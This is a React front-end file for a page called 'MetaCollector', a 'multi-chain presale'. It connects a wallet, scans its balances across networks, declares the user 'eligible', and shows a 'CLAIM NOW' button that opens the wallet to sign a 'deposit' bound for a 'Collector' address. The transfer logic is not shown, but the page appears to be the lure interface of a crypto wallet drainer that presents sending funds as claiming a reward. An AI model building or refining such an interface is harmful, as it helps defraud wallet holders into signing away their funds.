import React from 'react'
import { useMetaCollector } from './hooks/useMetaCollector'
import './App.css'

function App() {
  const {
    address,
    isConnected,
    loading,
    claimLoading,
    balanceResults,
    eligibleNetworks,
    bestNetwork,
    transactionStatus,
    currentNonce,           // Add this
    isFetchingNonce,        // Add this
    checkBalances,
    claimDeposit,
    handleConnect,
    handleDisconnect,
    refreshNonce            // Add this
  } = useMetaCollector()

  return (
    <div className="app">
      <div className="container">
        <header className="header">
          <h1>🔮 MetaCollector</h1>
          <p>Multi-Chain Presale with Relayer</p>
          <div className="contract-badge">
            <span>Contract: 0x377a...7bd8</span>
            <span>Collector: 0xde6b...e1824</span>
          </div>
        </header>

        <main className="main">
          {/* Wallet Connection */}
          <div className="card wallet-card">
            <h2>🔌 Wallet Connection</h2>
            {!isConnected ? (
              <button 
                onClick={handleConnect} 
                className="button button-primary button-large"
              >
                Connect Wallet
              </button>
            ) : (
              <div className="wallet-info">
                <div className="address-container">
                  <span className="address-label">Connected:</span>
                  <span className="address">
                    {address?.slice(0, 6)}...{address?.slice(-4)}
                  </span>
                </div>
                
                {/* Display current nonce for the selected network */}
                {bestNetwork && currentNonce !== null && (
                  <div className="nonce-display">
                    <span className="nonce-label">Current Nonce:</span>
                    <span className="nonce-value">{currentNonce}</span>
                    <button 
                      onClick={refreshNonce} 
                      className="button button-small button-secondary"
                      disabled={isFetchingNonce}
                    >
                      {isFetchingNonce ? '🔄' : '↻'}
                    </button>
                  </div>
                )}
                
                <div className="wallet-actions">
                  <button 
                    onClick={handleConnect} 
                    className="button button-secondary"
                  >
                    Switch
                  </button>
                  <button 
                    onClick={handleDisconnect} 
                    className="button button-danger"
                  >
                    Disconnect
                  </button>
                </div>
              </div>
            )}
          </div>

          {/* Balance Check Button - Only show when connected */}
          {isConnected && (
            <div className="card eligibility-card">
              <h2>💰 Check Balances</h2>
              <button 
                onClick={checkBalances} 
                className="button button-primary button-large"
                disabled={loading}
              >
                {loading ? 'Checking...' : 'Check Wallet Balances'}
              </button>

              {/* Show Balance Results */}
              {balanceResults && (
                <div className="balance-results">
                  <h3>Network Balances (need ~$1 min):</h3>
                  <div className="networks-grid">
                    {Object.values(balanceResults).map((network) => (
                      <div 
                        key={network.network}
                        className={`network-card ${network.canParticipate ? 'eligible' : ''}`}
                      >
                        <div className="network-header">
                          <span className="network-name">{network.networkName}</span>
                          {network.canParticipate && (
                            <span className="eligible-badge">✅ Eligible</span>
                          )}
                        </div>
                        <div className="balance-display">
                          <span className="balance-value">{network.balanceFormatted}</span>
                          <span className="balance-currency">{network.currency}</span>
                        </div>
                        <div className="threshold-info">
                          Need: {network.minRequired} {network.currency}
                        </div>
                        {network.error && (
                          <div className="error-info">⚠️ {network.error}</div>
                        )}
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* CLAIM BUTTON - Auto appears when eligible */}
              {eligibleNetworks.length > 0 && bestNetwork && (
                <div className="claim-section">
                  <div className="claim-header">
                    <span className="claim-badge">🎉 ELIGIBLE ON {bestNetwork.networkName}</span>
                  </div>
                  
                  {/* Show nonce information before claiming */}
                  <div className="nonce-info">
                    <p>Using nonce: <strong>{currentNonce !== null ? currentNonce : 'Fetching...'}</strong></p>
                    <p className="nonce-hint">This nonce is fetched from the contract via relayer</p>
                  </div>
                  
                  <button
                    onClick={claimDeposit}
                    disabled={claimLoading || isFetchingNonce || currentNonce === null}
                    className="button button-claim button-large"
                  >
                    {claimLoading ? (
                      <>
                        <span className="spinner"></span>
                        Processing...
                      </>
                    ) : isFetchingNonce ? (
                      <>
                        <span className="spinner"></span>
                        Fetching Nonce...
                      </>
                    ) : (
                      <>
                        <span className="claim-icon">⚡</span>
                        CLAIM NOW
                      </>
                    )}
                  </button>

                  <p className="claim-hint">
                    Click to auto-claim on {bestNetwork.networkName} (AppKit wallet will open for signing)
                  </p>
                </div>
              )}

              {/* No Funds Message */}
              {eligibleNetworks.length === 0 && balanceResults && !loading && (
                <div className="no-eligibility">
                  <p>❌ No network has sufficient balance</p>
                  <p className="hint">You need at least $1 worth of native currency for gas</p>
                </div>
              )}
            </div>
          )}

          {/* Not Connected Message */}
          {!isConnected && (
            <div className="card info-card">
              <p>Please connect your wallet to check balances and claim</p>
            </div>
          )}

          {/* Transaction Status */}
          {transactionStatus && (
            <div className={`card status-card ${transactionStatus.type}`}>
              <div className="status-header">
                {transactionStatus.type === 'pending' && '⏳'}
                {transactionStatus.type === 'success' && '✅'}
                {transactionStatus.type === 'error' && '❌'}
                {transactionStatus.type === 'info' && 'ℹ️'}
                <h3>
                  {transactionStatus.type.charAt(0).toUpperCase() + transactionStatus.type.slice(1)}
                </h3>
              </div>
              <p className="status-message">{transactionStatus.message}</p>
              {transactionStatus.hash && (
                <a 
                  href={`https://etherscan.io/tx/${transactionStatus.hash}`}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="tx-link"
                >
                  View Transaction ↗
                </a>
              )}
            </div>
          )}
        </main>

        <footer className="footer">
          <p>MetaCollector • One-Click Claim • $1 Minimum Balance Required</p>
          <p className="powered-by">Powered by Reown AppKit</p>
        </footer>
      </div>
    </div>
  )
}

export default App
